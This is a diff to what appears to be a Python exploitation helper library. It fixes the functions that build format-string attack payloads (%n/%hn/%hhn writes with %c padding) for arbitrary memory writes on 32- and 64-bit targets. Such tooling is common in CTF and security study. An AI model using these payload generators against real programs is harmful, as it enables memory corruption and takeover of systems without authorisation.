@@ -40,13 +40,18 @@ def fsa_write_32(value: int, nth_stack: int, target_addr: int | None = None, off
         for i in range(0, BYTE_WIDTH, each):
             payload += p32(target_addr + i)
 
-    previous_value = 0
-    current_value = len(payload)
+    max_value = 1 << (8 * each)  # 256 for hhn, 65536 for hn, etc.
+    written = len(payload)
+
     for i in range(0, BYTE_WIDTH, each):
-        previous_value = current_value
-        current_value = value % (1 << 8 * each)
-        offset = (current_value - previous_value) % (1 << 8 * each)
-        payload += f"%{offset}c%{nth_stack}${format_string[each]}".encode()
+        target_byte = value % max_value
+        diff = (target_byte - written) % max_value
+        if diff == 0:
+            # No %c needed, just write current count
+            payload += f"%{nth_stack}${format_string[each]}".encode()
+        else:
+            payload += f"%{diff}c%{nth_stack}${format_string[each]}".encode()
+            written = target_byte
         value >>= 8 * each
         nth_stack += 1
 
@@ -57,14 +62,13 @@ def fsa_write_64(write_dict: dict[int, int], nth_stack: int, written_bytes_num: 
     """Arbitrary write using format string bug (64bit)
 
     Args:
-        target_addr (int): The address where the content will be written.
-        value (int): The value to write.
+        write_dict (dict[int, int]): A dictionary of {address: value} pairs to write.
         nth_stack (int): example
                     "AAAA%p %p %p..."
                     -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                     -> 7th (0x4141d402)
+        written_bytes_num (int, optional): Number of bytes already written. Defaults to 0.
         offset (int, optional): From nth_stack's example, offset is 2 (0x4141d402).
-        bits (int, optional): The bits of the target binary.
         each (int, optional): Write the value by each n bytes.
     Returns:
         bytes: The payload
@@ -87,17 +91,21 @@ def fsa_write_64(write_dict: dict[int, int], nth_stack: int, written_bytes_num: 
         payload = payload.ljust(BYTE_WIDTH, b"A")  # Align stack
         nth_stack += 1
 
+    max_value = 1 << (8 * each)
+
     for addr, value in write_dict.items():
-        value = p64(value)
+        value_bytes = p64(value)
         for i in range(0, BYTE_WIDTH, each):
-            where = p64(addr + i)
-            what = (value[i : i + each] - written_bytes_num) % (1 << 8 * each)
-            payload_ += f"%{what:010}c%{nth_stack:03}${format_string[each]}".encode()
-
+            target_byte = int.from_bytes(value_bytes[i : i + each], "little")
+            diff = (target_byte - written_bytes_num) % max_value
+            if diff == 0:
+                payload += f"%{nth_stack:03}${format_string[each]}".encode()
+            else:
+                payload += f"%{diff:010}c%{nth_stack:03}${format_string[each]}".encode()
+                written_bytes_num = target_byte
             nth_stack += 1
-        value = value % (1 << 8 * each)
 
-    payload_ += b"A" * (-len(payload_) % byte_len)  # Align stack
+    payload += b"A" * (-len(payload) % BYTE_WIDTH)  # Align stack
 
     if b"\0" in payload.strip(b"\0"):
         logger.warning("The payload includes some null bytes.")
